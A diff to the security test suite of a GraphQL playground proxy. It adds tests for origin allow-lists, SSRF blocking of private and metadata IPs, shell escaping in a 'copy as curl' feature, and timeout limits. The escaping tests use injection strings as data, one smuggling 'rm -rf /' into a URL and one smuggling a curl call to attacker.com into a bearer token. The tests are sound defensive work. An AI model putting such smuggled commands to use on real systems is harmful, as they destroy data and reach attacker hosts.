@@ -168,9 +168,15 @@ describe('Proxy security: Origin validation', () => {
     expect(allowedOrigins).toContain('https://icjia-graphql-playground.netlify.app')
   })
 
-  it('allows localhost development origins', () => {
-    expect(allowedOrigins).toContain('http://localhost:3000')
-    expect(allowedOrigins).toContain('http://localhost:3001')
+  it('does not include localhost origins in production config', () => {
+    expect(allowedOrigins).not.toContain('http://localhost:3000')
+    expect(allowedOrigins).not.toContain('http://localhost:3001')
+  })
+
+  it('only contains HTTPS origins', () => {
+    for (const origin of allowedOrigins) {
+      expect(origin).toMatch(/^https:\/\//)
+    }
   })
 
   it('does not allow arbitrary origins', () => {
@@ -258,6 +264,84 @@ describe('Proxy security: Bearer token handling', () => {
     for (const ep of playgroundConfig.exampleEndpoints) {
       expect(ep.url).toMatch(/^https:\/\//)
     }
+  })
+})
+
+describe('Proxy security: DNS resolution SSRF defense', () => {
+  it('isPrivateIP catches resolved private IPs from DNS', () => {
+    // After DNS resolution, these resolved IPs should be blocked
+    expect(isPrivateIP('127.0.0.1')).toBe(true)
+    expect(isPrivateIP('10.0.0.1')).toBe(true)
+    expect(isPrivateIP('192.168.1.1')).toBe(true)
+    expect(isPrivateIP('172.16.0.1')).toBe(true)
+  })
+
+  it('isPrivateIP allows resolved public IPs', () => {
+    expect(isPrivateIP('8.8.8.8')).toBe(false)
+    expect(isPrivateIP('104.21.32.1')).toBe(false)
+    expect(isPrivateIP('13.107.42.14')).toBe(false)
+  })
+
+  it('link-local 169.254.169.254 is in blocked hostnames', () => {
+    const blocked = playgroundConfig.proxy.blockedHostnames
+    expect(blocked).toContain('169.254.169.254')
+  })
+})
+
+describe('Proxy security: Shell escape for CURL copy', () => {
+  // Replicate the shellEscape function from ToolbarActions.vue
+  function shellEscape(s: string): string {
+    return s.replace(/'/g, "'\\''")
+  }
+
+  it('escapes single quotes in URLs', () => {
+    const malicious = "https://evil.com/graphql'; rm -rf / #"
+    const escaped = shellEscape(malicious)
+    // The single quote should be replaced with the shell escape pattern
+    // Verify the escape pattern is present (close-quote, backslash-quote, open-quote)
+    expect(escaped).toContain("'\\''")
+    // Original unescaped single quote should not appear as-is
+    expect(escaped).not.toBe(malicious)
+    // The escaped string has more characters than the original due to escaping
+    expect(escaped.length).toBeGreaterThan(malicious.length)
+  })
+
+  it('leaves clean URLs unchanged', () => {
+    const clean = 'https://api.example.com/graphql'
+    expect(shellEscape(clean)).toBe(clean)
+  })
+
+  it('escapes single quotes in bearer tokens', () => {
+    const malicious = "token'; curl attacker.com #"
+    const escaped = shellEscape(malicious)
+    // The single quote is properly escaped with the '\'' pattern
+    expect(escaped).toContain("'\\''")
+  })
+
+  it('escapes single quotes in JSON body', () => {
+    const json = JSON.stringify({ query: "{ user(name: \"O'Brien\") { id } }" })
+    const escaped = shellEscape(json)
+    // The single quote in O'Brien is escaped
+    expect(escaped).toContain("'\\''")
+    expect(escaped).not.toBe(json)
+  })
+
+  it('handles strings with no single quotes', () => {
+    expect(shellEscape('hello world')).toBe('hello world')
+  })
+
+  it('handles strings with multiple single quotes', () => {
+    expect(shellEscape("it's a test's case")).toBe("it'\\''s a test'\\''s case")
+  })
+})
+
+describe('Proxy security: Redirect protection', () => {
+  it('proxy config uses a 30s timeout to prevent slow-loris', () => {
+    expect(playgroundConfig.proxy.requestTimeout).toBe(30_000)
+  })
+
+  it('max query length prevents resource exhaustion', () => {
+    expect(playgroundConfig.proxy.maxQueryLength).toBe(100_000)
   })
 })
 
